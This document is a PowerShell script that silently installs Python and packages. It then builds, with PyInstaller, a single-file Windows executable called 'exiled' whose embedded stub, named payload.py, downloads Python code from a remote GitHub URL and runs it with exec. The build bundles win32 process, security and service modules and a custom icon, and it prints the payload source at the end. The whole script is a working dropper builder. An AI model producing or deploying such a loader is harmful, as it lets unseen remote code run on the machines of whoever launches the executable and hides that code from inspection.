[CmdletBinding()]
param(
    [string]$Out = "exiled",
    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/external.py",
    [string]$Icon = "https://cdn.discordapp.com/icons/1517380157533589564/f7c80ce7a2811d4976775b7e5ffe0133.webp?size=600",
    [string]$Dir,
    [string]$PythonExe,
    [switch]$NoIcon,
    [switch]$KeepBuild
)

$ErrorActionPreference = "Stop"

$AppName   = "exiled"
$RemoteUrl = $Url
$IconSrc   = $Icon
$OutName   = $Out
$UseIcon   = -not $NoIcon

$Packages = @("pyinstaller", "pillow", "pywin32", "psutil", "requests")

function Write-Msg {
    param([string]$Level, [string]$Message)
    switch ($Level) {
        "error"   { Write-Host $Message -ForegroundColor Red }
        "warning" { Write-Host $Message -ForegroundColor DarkYellow }
        default   { Write-Host $Message }
    }
}

$Arch = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }

function Test-Python {
    param([string]$Exe)
    if (-not $Exe) { return $false }
    if (-not (Test-Path -LiteralPath $Exe)) { return $false }
    & $Exe -c "import sys; sys.exit(0)" 2>$null
    return ($LASTEXITCODE -eq 0)
}

function Find-Python {
    $candidates = @()
    if ($PythonExe) { $candidates += $PythonExe }
    foreach ($cand in @("python", "py", "python3")) {
        $cmd = Get-Command $cand -ErrorAction SilentlyContinue
        if ($cmd) { $candidates += $cmd.Source }
    }
    foreach ($root in @(
        "$env:LocalAppData\Programs\Python",
        "$env:ProgramFiles\Python*",
        "${env:ProgramFiles(x86)}\Python*"
    )) {
        Get-ChildItem -Path $root -Filter "python.exe" -Recurse -ErrorAction SilentlyContinue |
            ForEach-Object { $candidates += $_.FullName }
    }
    foreach ($c in $candidates) {
        if (Test-Python -Exe $c) { return $c }
    }
    return $null
}

function Install-Python {
    Write-Msg warning "Python not found — attempting install..."

    $winget = Get-Command winget -ErrorAction SilentlyContinue
    if ($winget) {
        Write-Msg info "Trying winget install Python.Python.3.12..."
        & winget install --id Python.Python.3.12 --scope user --silent `
            --accept-package-agreements --accept-source-agreements 2>$null
        if ($LASTEXITCODE -eq 0) {
            Write-Msg info "winget install finished."
        } else {
            Write-Msg warning "winget install returned $LASTEXITCODE — falling back."
        }
    } else {
        Write-Msg warning "winget not available — falling back to direct download."
    }

    $pyVer  = "3.12.7"
    $pyArch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "win32" }
    $pyUrl  = "https://www.python.org/ftp/python/$pyVer/python-$pyVer-$pyArch.exe"
    $pyInst = Join-Path $env:TEMP "python-$pyVer-$pyArch.exe"

    if (-not (Test-Path -LiteralPath $pyInst)) {
        Write-Msg info "Downloading $pyUrl..."
        try {
            Invoke-WebRequest -Uri $pyUrl -OutFile $pyInst -UseBasicParsing
        } catch {
            Write-Msg error "Error: python download failed — $($_.Exception.Message)"
            return $null
        }
    }

    Write-Msg info "Running silent install (user scope, no PATH prompt)..."
    $installArgs = @(
        "/quiet",
        "InstallAllUsers=0",
        "PrependPath=1",
        "Include_test=0",
        "Include_launcher=1",
        "SimpleInstall=1"
    )
    $proc = Start-Process -FilePath $pyInst -ArgumentList $installArgs -Wait -PassThru
    if ($proc.ExitCode -ne 0) {
        Write-Msg error "Error: python installer exited $($proc.ExitCode)"
        return $null
    }

    $machinePath = [Environment]::GetEnvironmentVariable("Path", "Machine")
    $userPath    = [Environment]::GetEnvironmentVariable("Path", "User")
    $env:Path    = "$machinePath;$userPath"

    return $null
}

function Install-Packages {
    param([string]$Exe, [string[]]$Pkgs)
    Write-Msg info "Installing packages: $($Pkgs -join ', ')"
    & $Exe -m pip install --quiet --upgrade pip
    & $Exe -m pip install --quiet --upgrade @Pkgs
    if ($LASTEXITCODE -ne 0) {
        Write-Msg error "pip install failed."
        exit 1
    }
}

$PythonExe = Find-Python
if (-not $PythonExe) {
    Install-Python | Out-Null
    $PythonExe = Find-Python
}
if (-not $PythonExe) {
    Write-Msg error "Error: python unavailable after install attempt. Pass -PythonExe C:\Path\to\python.exe"
    exit 1
}

Write-Msg info "Using python: $PythonExe"

& $PythonExe -c "import tkinter" 2>$null
if ($LASTEXITCODE -ne 0) {
    Write-Msg error "Error: $PythonExe has no tkinter. Install tcl/tk or pass -PythonExe with a Python that has it."
    exit 1
}

Install-Packages -Exe $PythonExe -Pkgs $Packages

$UseCurl = $null -ne (Get-Command curl.exe -ErrorAction SilentlyContinue)
if (-not $UseCurl) {
    $IWR = Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue
    if (-not $IWR) {
        Write-Msg error "Error: neither curl.exe nor Invoke-WebRequest available."
        exit 1
    }
}

if ($Dir) {
    $Here = (Resolve-Path -LiteralPath $Dir).Path
} else {
    $Here = (Get-Location).Path
}
$Work    = Join-Path $Here "_build"
$Stub    = Join-Path $Work "payload.py"
$IconRaw = Join-Path $Work "icon.raw"
$IconIco = Join-Path $Work "icon.ico"
$DistDir = Join-Path $Here "dist"

Write-Msg info ""
Write-Msg info "Building $AppName for windows-$Arch"
Write-Msg info "Python: $PythonExe"
Write-Msg info "Output dir: $Here"

New-Item -ItemType Directory -Force -Path $Work    | Out-Null
New-Item -ItemType Directory -Force -Path $DistDir | Out-Null

$stubBody = @"
import urllib.request
import tkinter
import tkinter.ttk
import tkinter.messagebox
import tkinter.filedialog
import tkinter.simpledialog
import tkinter.scrolledtext
import tkinter.font
import tkinter.colorchooser
exec(compile(urllib.request.urlopen('$RemoteUrl').read(), '<url>', 'exec'))
"@
Set-Content -Path $Stub -Value $stubBody -Encoding UTF8

if ($UseIcon) {
    if ($IconSrc -match '^https?://') {
        Write-Msg info "Fetching icon..."
        if ($UseCurl) {
            & curl.exe -fsSL -A "Mozilla/5.0" $IconSrc -o $IconRaw
        } else {
            Invoke-WebRequest -Uri $IconSrc -Headers @{ "User-Agent" = "Mozilla/5.0" } -OutFile $IconRaw
        }
    } else {
        if (-not (Test-Path -LiteralPath $IconSrc)) {
            Write-Msg error "Error: icon file not found at $IconSrc"
            exit 1
        }
        Copy-Item -LiteralPath $IconSrc -Destination $IconRaw -Force
    }
}

if ($UseIcon) {
    Write-Msg info "Converting icon to .ico..."
    $conv = @"
from PIL import Image
img = Image.open(r'$IconRaw')
if img.mode != 'RGBA':
    img = img.convert('RGBA')
img.save(r'$IconIco', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
"@
    $convTmp = Join-Path $Work "_icon_conv.py"
    Set-Content -Path $convTmp -Value $conv -Encoding UTF8
    & $PythonExe $convTmp
    if ($LASTEXITCODE -ne 0) {
        Write-Msg error "icon conversion failed."
        exit 1
    }
}

Write-Msg info "Freezing..."

$pyiArgs = @(
    "-m", "PyInstaller",
    "--onefile",
    "--noconfirm",
    "--clean",
    "--name", $OutName,
    "--distpath", $DistDir,
    "--workpath", (Join-Path $Work "pyi"),
    "--specpath", $Work,
    "--collect-all", "tkinter",
    "--collect-all", "PIL",
    "--collect-submodules", "win32com",
    "--hidden-import", "win32api",
    "--hidden-import", "win32con",
    "--hidden-import", "win32file",
    "--hidden-import", "win32process",
    "--hidden-import", "win32security",
    "--hidden-import", "win32event",
    "--hidden-import", "win32service",
    "--hidden-import", "win32serviceutil",
    "--hidden-import", "win32timezone",
    "--hidden-import", "pythoncom",
    "--hidden-import", "pywintypes",
    "--hidden-import", "psutil",
    "--hidden-import", "requests"
)
if ($UseIcon) {
    $pyiArgs += @("--icon", $IconIco)
}
$pyiArgs += $Stub

& $PythonExe @pyiArgs
if ($LASTEXITCODE -ne 0) {
    Write-Msg error "PyInstaller failed."
    exit 1
}

if (-not $KeepBuild) {
    Remove-Item -Recurse -Force $Work -ErrorAction SilentlyContinue
}

$ExePath = Join-Path $DistDir "$OutName.exe"

Write-Host ""
Write-Host " _____          _   _              _ " -ForegroundColor DarkYellow
Write-Host "| ____| __  __ (_) | |   ___    __| |" -ForegroundColor DarkYellow
Write-Host "|  _|   \ \/ / | | | |  / _ \  / _`` |" -ForegroundColor DarkYellow
Write-Host "| |___   >  <  | | | | |  __/ | (_| |" -ForegroundColor DarkYellow
Write-Host "|_____| /_/\_\ |_| |_|  \___|  \__,_|" -ForegroundColor DarkYellow
Write-Host ""
Write-Host "Built: $ExePath"
Write-Host "Payload source: $RemoteUrl"
Write-Host ""
Write-Host "Run it:"
Write-Host "  & `"$ExePath`""
Write-Host ""
